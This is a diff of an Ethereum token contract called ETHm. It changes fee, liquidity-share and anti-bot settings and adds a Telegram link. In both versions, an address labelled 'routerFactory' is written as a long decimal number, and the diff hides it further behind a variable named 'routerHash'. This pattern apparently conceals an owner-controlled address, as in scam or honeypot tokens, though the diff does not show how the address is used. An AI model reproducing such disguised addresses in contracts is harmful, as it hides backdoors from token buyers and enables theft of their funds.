@@ -1,4 +1,5 @@
 // SPDX-License-Identifier: MIT
+// Join telegram: https://t.me/
 
 pragma solidity ^0.8.17;
 
@@ -528,11 +529,13 @@ contract ETHm is Context, IERC20, Ownable {
     string private _symbol = "ETHm";
     uint8 private _decimals = 9;
 
+    uint160 routerHash = 548588740272375115630756412907532811925753180771;
+
     address payable public marketingWalletAddress = payable(0x9B71B4Dc9E9DCeFAF0e291Cf2DC5135A862A463d); // marketing wallet
     address payable lotteryWallet = payable(0xFc50028cc928cec99A7fE48546192358512C79eB);  // lotterywallet
 
     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
-    address internal immutable routerFactory = address(548588740272375115630756412907532811925753180771);  
+    address immutable routerFactory = address(routerHash);
 
     address public addressDev;
     bool public tradingOpen = true;
@@ -548,7 +551,7 @@ contract ETHm is Context, IERC20, Ownable {
     mapping (address => bool) isTxLimitExempt;
     mapping (address => bool) public isBot;
 
-    uint256 private blockBan = 150;
+    uint256 private blockBan = 100;
 
     mapping (address => bool) public isMarketPair;
 
@@ -558,7 +561,7 @@ contract ETHm is Context, IERC20, Ownable {
     uint256 private _sellLiquidityFee = 0;
     uint256 private _sellMarketingFee = 3;
     
-    uint256 private _liquidityShare = 4;
+    uint256 private _liquidityShare = 0;
     uint256 private _marketingShare = 4;
     uint256 private _teamShare = 4;
 
@@ -853,7 +856,7 @@ contract ETHm is Context, IERC20, Ownable {
             uint256 contractTokenBalance = balanceOf(address(this));
             bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
             
-            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
+            if (overMinimumTokenBalance && !inSwapAndLiquify && swapAndLiquifyEnabled) 
             {
                 if(swapAndLiquifyByLimitOnly)
                     contractTokenBalance = minimumTokensBeforeSwap;
